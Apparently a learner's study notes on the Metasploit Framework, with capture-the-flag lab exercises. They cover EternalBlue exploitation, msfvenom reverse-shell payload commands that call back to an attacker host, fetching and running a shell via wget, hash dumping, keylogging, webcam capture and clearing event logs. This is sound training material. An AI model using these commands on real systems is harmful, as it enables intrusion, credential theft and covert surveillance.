# Commands

# Modules and Categories
The main interaction with the Metasploit Framework will be done with the console, which you can launch from the terminal with `msfconsole`. Where you will interact with the modules, which are used to perform exploitation, scanning and attacks.
Some recuring concepts that might need some explanation:
- **Vulnerability:** Design, coding or logic flaw that can be exploited. 
- **Exploit:** Code that exploits a vulnerability on the target.
- **Payload:** Code that runs on the target system and can allow you to gain access, read files, ...

**Auxiliary**
This category includes modules such as scanners, crawlers and fuzzers.

**Encoders**
This allows you to encode exploits and payloads so signature based detection will miss them, this is however not a direct attempt to evade antivirus software.

**Evasion**
With evasion modules you can try to evade antivirus software, but will not always be successful

**Exploits**
Here can all the exploits be found, organized by target system.

**Payloads**
Examples of what a payload can achieve are getting a shell, loading a malware or backdoor, running a command. launching a program as proof during a penetration test.
There are four different categories:
- **Singles:** Self-contained payloads (add user, launch notepad, ...) that do not need to download an additional components.
- **Adapters:** Wraping single payloads to convert them into different formats; f.e. wraping a normal single payload inside a Powershell adapter, resulting that a single Powershell command will execute the payload.
- **Staged Payloads:** Uploads a "Stager" first on the target and then download the rest of the payload ("Stage"). This has the advantage as the initial payload has a small size compared to the full payload.
- **Stagers:** Responsible for setting up a connection channel between Metasploit and the target system when unsing "Staged payloads"
- **Stages:** Downloaded by the "Stager", allowing the use of larger sized payloads.

Single payloads can be identified by a `_`  between shell and reverse, f.e. generic/shell_reverse_tcp
Staged payloads can be identified by a `/` between shell and reverse, f.e. windows/x64/shell/reverse_tcp

**Post**
Post modules are used in the final stage of penetration, post-exploitation.
# Msfconsole
As stated earlier the msfconsole is the main interface with which you will interact. It is managed by context which means that entered parameter will be lost if you switch to another module, unless it is set as a global variable.
The basic commands to use are:
- **use**: set the context to a module; use a module
- **show options**: show the needed parameters and other info about the module
- **back:** leave the context
- **info:** further inforamtion about the module
- **search:** search for modules by CVE number, exploit name or target system

The *Metasploit* console can be used just like a regular console and supports most *Linux* commands. 

# Working with Modules
1. To select a module you use the `use` command:
```
use exploit/windows/smb/ms17_010_eternalblue
```
2. Use the `show option` command to list the needed and optional parameters 
3. Use `set` to assign a value to the variable or `setg` to set it as a global variable
```
set rhosts 192.168.1.101
setg rhosts 192.168.1.101
 ```
4. Use `exploit` or `run` to start the exploit; ( use `exploit -z` to run the exploit in the background)
5. After the exploit was successfull a *session*, a connection to the target, is established; you can use `background` or `CTRL+Z` to background the session, `sessions` to see the existing sessions, `sessions -i [command]` to interact with a session

Some modules support the `check` option, checking if the target system is vulnerable without exploiting it.

**Example**
# Exploitation

Wordist: /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
## Scanning
**Port Scanning**
You can search port scanning modules with `search portscan` and also perform a [[Network Exploitation Basics#Nmap|Nmap]] scan directly from the msfconsole.

**UDP Service Identification**
The `scanner/discover/udp_sweep` module allows you to perform a quick but not extensive scan of all possible UDP services that run the *UDP*.

**SMB Scans**
Metasploit offers several auxiliary modules, incuding `smb_enumshares` and `smb_version` which are usefull in, f.e. corporate settings where [[Network Exploitation Basics#Server Message Block (SMB)|SMB]] is used.

| Auxiliary Module             | Description                                                         |
| ---------------------------- | ------------------------------------------------------------------- |
| `scanner/smb/smb_enumshares` | enumerates the all available shares on the target                   |
| `scanner/smb/smb_enumusers`  | connect to the target(s) via SMB RPC and enumerates the users on it |
| `scanner/smb/smb_login`      | attempts to login                                                   |

**NetBIOS**
When scanning a network you should not omit services like *Network Basic Inout Output System (NetBIOS)*, which, similar to SMB, allows computers on the network to communicate, share files or send them to a printer. The name of the target might reveal its role or importance (f.e. CORP-DC, SALES, ...) or there are shared files and folders with weak passwords (f.e. admin, root, ...).

**Exercise**
1. We start the framework by entering `msfconsole` into the terminal
2. We scan the target with Nmap `nmap -sS 10.10.21.38` and discover 5 open ports:
	- 21: ftp
	- 22: ssh
	- 139: netbios-ssn
	- 445: microsoft-ds
	- 8000: http-alt
3. We use `search netbios` to find useful modules and select the `auxiliary/scanner/netbios/nbname` module, set the parameter and discover the NetBIOS name "ACME IT SUPPORT"
4. We use the `auxiliary/scanner/http/http_versions` module that lets us see the version running on port 8000, set the parameters and get "webfs/1.21"
5. We use the `auxiliary/scanner/smb/smb_login` module to get the password used by the user "penny" for the SMB. We set the "SMBUser" to "penny" and the "PASS_FILE" to "/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt"; the other parameters should be clear. Run the exploit and get the password "leo1234"

## Metasploid Database
The Database can come in handy when having multiple targets and simplifies project managment and parameter confusion.
1. Use `systemctl start postgresql` to start the *PostgreSQL* database which *Metasploit* will use
2. Start the *Metasploit Database* with `msfdb init`
3. Launch *Metasploit* with `msfconsole` and check the database with `db_status`
4. You can list available workspaces with `workspace`, add a workspace with the `-a` parameter and delete one with the `-d` parameter; new workspaces start with a `*` and to navigate to another workspace use `workspace name`; use `-h` to list the available options for the `workspace command`
5. Use `db_nmap` to perform a nmap scan and store the results to the database
6. You can reach information relevant to hosts and services commands and with `hosts -h` and `services -h` you can display the available options; set RHOSTS parameter with `hosts -R`

**Example Workflow**
1. We scan the target for vulnerabilities with `use auxiliary/scanner/smb/smb_ms17_010` 
2. Set RHOSTS with `hosts -R`
3. Check if all values are correct with `show options` (the IP is already set when a `db_nmap` scan is performed)
4. Run the exploit with `exploit` or `run`

If there is more than on hosts saved in the database all IP addresses are used when `hosts -R` is performed, which can be used like:
- Find available targets with `sb_nmap`
- Scan these for open ports or vulnerabilities; use `services -S name` to search for specific services

[[Network Exploitation Basics#Network Services|Services]] you should check are:
**HTTP:** May host a web application where you can perform a SQL Injection or Remote Code Execution
**FTP:** Could allow anonymous login and access to files
**SMB:** Could be vulnerable to exploits like MS17-010
**SSH:** Could have default or weak credentials
**RDP:** Could be vulnerable to Bluekeep or allow desktop access when weak credentials are used
## Vulnerability Scanning
Finding vulnerabilities with *Metasploit* relies heaviliy on your ability to scan and fingerprint your target and allows you to quickly identify critical vulnerabilities.
**Example Workflow:**
1. You identify a VNC service running on your target
2. Using the `search VNC` to list useful modules and look for a scanner
3. We find and use `use auxiliary/scanner/vnc/vnc_login`, which helps us find login details 
4. Use `info` to find out more about the module
## Exploitation
Most exploits have a preset  default payload, which you can change by displaying other commands with `show payloads` and `set payload` to select one. Choosing a working payload could be a trial and error process.
Some payloads will have new parameter that you need to set, which you can see with `show options`.

**Working with Sessions**
The `sessions` command lists all active sessions and supports a number of options, f.e. interacting with a session by using `sessions -i session-id`

**Exercise**
1. We scan our target with nmap `nmap -sS 10.10.158.115` and discover open ports:
	- 135: msrpc
	- 139: netbios-ssn
	- 445: microsoft-ds
	- 3389: ms-wbt-server
2. We use the `auxiliary/scanner/smb/smb_ms17_010` to check if the SMB service on port 445 is vulnerable to the `ms17_010` exploit, which gives us a reverse shell
3. The target is vulnerable so we use the `windows/smb/ms17_010_eternalblue` module, use `show payloads` and set the payload to `windows/x64/meterpreter/reverse_tcp`, run the exploit and get a reverse shell.
4. We use the following commands to find the flag:
```
dir
cd C:/
dir
cd Users
dir
cd Jon
dir 
cd Documents
dir
type flag.txt
```
(dir displays the content of the current directory)
5. We use `cat flag.txt` to read display the flag
6. We use `hashdump` to get the password hash of the user "pirate"; 8ce9a3ebd1647fcc5e04025019f4b875, which when decrypted is "pirate123"
## Msfvenom
Msfvenom allows you to create payloads in different formats (PHP, exe, dll, elf, ...) and for many systems (Apple, Windows, Android, Linux, ...) by giving access to all payloads available in the Metasploit framework.

**Output formats**
You can generate stand-alone payloads (f.e. a Windows executale for *Meterpreter*) or a usable raw format (f.e. python). To get a list of the output formats use `msfvenom --list formats`.

**Encoders**
Encoders do not bypass antivirus systems but encode payloads. You can encode payloads with the parameter `-e`.

**Handlers**
When using a reverse shell you need to accept incoming connections from the shell, this is done automaticaly handled by the exploit module.
A possible scenario could be:
- 1. Generate the PHP shell using MSFvenom
- 2. Start the Metasploit handler
- 3. Execute the PHP shell
```
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
```
Note: The output PHP file has the starting tag commented out and the end tag (`?>`).

We uses the Multi Handler to receive the incomin connection, which can be used with `use exploit/multi/handler`. The Multi handler supports all Metasploit payloads and can be used for *Metapreter* as well as regular shells. We also need to set the payload (`php/reverse_php`) to use the module.
When everything is set we will use `run`.

**Other Payloads**
*Metasploit* can create in almost all formats, based on the targets systems configuration (OS, install webserver, install interpreter, etc.)

| Format                                     |                                             Command                                              |
| ------------------------------------------ | :----------------------------------------------------------------------------------------------: |
| Linux Executable and Linkable Format (elf) | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.el` |
| Windows                                    | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  |
| PHP                                        |   `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`    |
| ASP                                        | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  |
| Python                                     |      `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`      |
All of these payloads are reverse payloads, so you need  the exploit/mult/handler module listening on your machine. The LHOST and LPORT parameter is the IP address of your machine and the port on which the handler will listen.

**Exercise**
1. We open a terminal and enter `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.2.72 LPORT=4444 -f elf > rev_shell.elf` to generate a linux reverse shell
2. We open *Metasploit* and use the `exploit/multi/handler` module to set up a listener; we set `lhost=10.10.2.72`, `lport=4444`, `payload=linux/x86/meterpreter/reverse_tcp`
3. We connect to the target with ssh(user:`murphy`, password: `1q2w3e4r`) and enter `sudo su` to get a root shell
```
ssh murphy@10.10.12.98
```
4. We start a http server on our machine with: `python3 -m http.server 9000` and on our target machine we use `wget http://ATTACKING_MACHINE_IP:9000/shell.elf` to get the reverse shell on it 
5. We enter `chmod +x rev_shell.elf` into the ssh terminal to make that file executable and execute it with `./rev_shell.elf`
6. We return to our *Metasploit* terminal where the listener is set up; background the session and search for "hashdump linux"; we get the module `post/linux/gather/hashdump`, set the session correctly and run it
7. We get the hashes and are finished with this exercise
# Meterpreter
*Meterpreter* is a payload that runs on the target system and acts as an agent within a command and control architecture, meaning you will interact with the target OS and files through *Meterpreters* commands. 

**How does Meterpreter work?**
*Meterpreter* runs on the target in RAM and does not write itself on the target in a file. This is to avoid detection during an antivirus scan.
It also tries to avoid detection by network-based *Intrusion Prevention System (IPS)* and *Intrusion Detection System (IDS)* by using encrypted communication with the server (usually your computer). If the target organization does not decrypt and inspect encrypted traffig (f.e. HTTPS) in the local network, *IPS* and *IDS* will not be able to detect its activities. *Meterpreter* is still detected by major antivirus software.
## Commands
**Core Commands**

| Command      | Description                                               |
| ------------ | --------------------------------------------------------- |
| `background` | Backgrounds the current session                           |
| `exit`       | Terminate the *Meterpreter* session                       |
| `guid`       | Get the session Globally Unique Identifier (GUID)         |
| `help`       | Display the help menu                                     |
| `info`       | Display information about a Post module                   |
| `ird`        | Open an interactive Ruby shell on the current session     |
| `load`       | Loads one or more *Meterpreter* extensions (Kiwi, Python) |
| `migrate`    | Migrate *Meterpreter* to another process                  |
| `run`        | Execute a *Meterpreter* script or Post module             |
| `sessions`   | Quikly switch to another session                          |
**File system commands**

| Command    | Description                         |
| ---------- | ----------------------------------- |
| `cat`      | Show the content of a file          |
| `cd`       | Change directory                    |
| `download` | Download a file or directory        |
| `edit`     | Allows you to edit a file           |
| `rm`       | Delete the specified file           |
| `pwd`      | Print the current working directory |
| `search`   | Search for files                    |
| `upload`   | Upload a file or directory          |
| `pwd`      | Print the current working directory |
**Networking commands**

| Command    | Description                                                |
| ---------- | ---------------------------------------------------------- |
| `arp`      | Displays the host *ARP* cache                              |
| `ifconfig` | Displays network interfaces available on the target system |
| `netstat`  | Display the network connections                            |
| `portfwd`  | Forwards a local port to a remote service                  |
| `route`    | View and modify the routing table                          |
**System commands**

| Command    | Description                                     |
| ---------- | ----------------------------------------------- |
| `clearev`  | Clear the event logs                            |
| `execute`  | Executes a command                              |
| `getpid`   | Show the current process identifier             |
| `getuid`   | Shows the user that *Meterpreter* is running as |
| `kill`     | Terminates a process                            |
| `pkill`    | Terminate a process by name                     |
| `ps`       | List running processes                          |
| `reboot`   | Reboots the remote computer                     |
| `shell`    | Drops into a system command shell               |
| `shutdown` | Shut down the remote computer                   |
| `sysinfo`  | Get information about the remote system         |
**Other Commands**

| Command         | Description                                                |
| --------------- | ---------------------------------------------------------- |
| `getsystem`     | Attempt to elevate your privileges of the local system     |
| `hashdump`      | Dump the content of the SAM database                       |
| `idletime`      | Return the number of seconds the remote user has been idle |
| `keyscan_dump`  | Dumps the keystroke buffer                                 |
| `keyscan_start` | Start capturing keystrokes                                 |
| `keyscan_stop`  | Stop capturing keystrokes                                  |
| `screenshare`   | Watch the remote user's desktop in real time               |
| `screenshot`    | Take a screenshot of the interactive desktop               |
| `record_mic`    | Records  audio from the default microphone for x seconds   |
| `webcam_chat`   | Start a video chat                                         |
| `webcam_list`   | List webcams                                               |
| `webcam_snap`   | Take a snapshot from the specified webcam                  |
| `webcam_stream` | Play a video stream from the specified webcam              |
## Payloads 
*Meterpreter* has a wide range of payloads, inckuding inline and staged, which you can list using 
```
msfvenom --list payloads | grep meterpreter
```
The list will show different versions available for the platforms:
- Android
- Apple iOS
- Java
- Linux
- OSX
- PHP
- Python
- Windows

Deciding on what version to use you should consider:
- The target's OS
- Components on the target (is it a *PHP* website, is *Python* installed, etc.)
- Network connection types that can be established (raw *TCP* ?, *HTTPS* reverse connection?, IPv6 addresses as closely monitored as IPv4?, etc.)
## Post-Exploitation 
In this phase of an attack you can concentrate on the following goals:
- Gathering further information
- Looking for interesting files, user credentials, additional network interfaces, ...
- Privilege escalation
- Lateral movement

**Migrate**
Migrating to another process help *Meterpreter* interact with it, f.e. a process like word.exe or notepad.exe is running so you migrate to it and start a keylogger.
To migrate to a process you need to know the process id which you can find out using `ps` and then `migrate pid`.
Be aware that you could lose your privileges when migrating form a higher privileged process to a less privileged one.

**Hashdump**
This command will list the content of the *Security Account Manager (SAM)* database, which stores the passwords of the users in the *New Technology LAN Manager (NTLM)* format.

**Search**
The search command is useful to locate files
```
search -f flag.txt
```

**Shell**
This command will launch a regular command-line shell. `CTRL+Z` gets you back to the *Meterpreter* shell.
# Post-Exploitation Challenge
We already have a username and password; ballen and Password1
1. We use the `exploit/windows/smb/psexec` module with the default *Meterpreter* payload to get access to the system
2. We use `sysinfo` to get more information about the computer, (Name, OS, Domain, Logged in users)
3. We navigate to `C:/shares` or background the current session, use the `windows/gather/enum_shares` to discover shares 
4. We migrate to the process `lsass.exe`, by first using `ps` and then `migrate 768`. After that we use `hashdump` to get a list of the passwords stored there.
5. We use https://hashes.com/en/decrypt/hash to crack the password hash of the user "jchambers" and get "trustno1"
6. We use `search -f secrets.txt` to find the file at `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt` and use `cat 'c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt'` to display the content "My Twitter password is KDSvbsw3849!"
7. We use `search -f realsecret.txt` to find the file and use `c:\inetpub\wwwroot\realsecret.txt` to display the content "The Flash is the fastest man alive"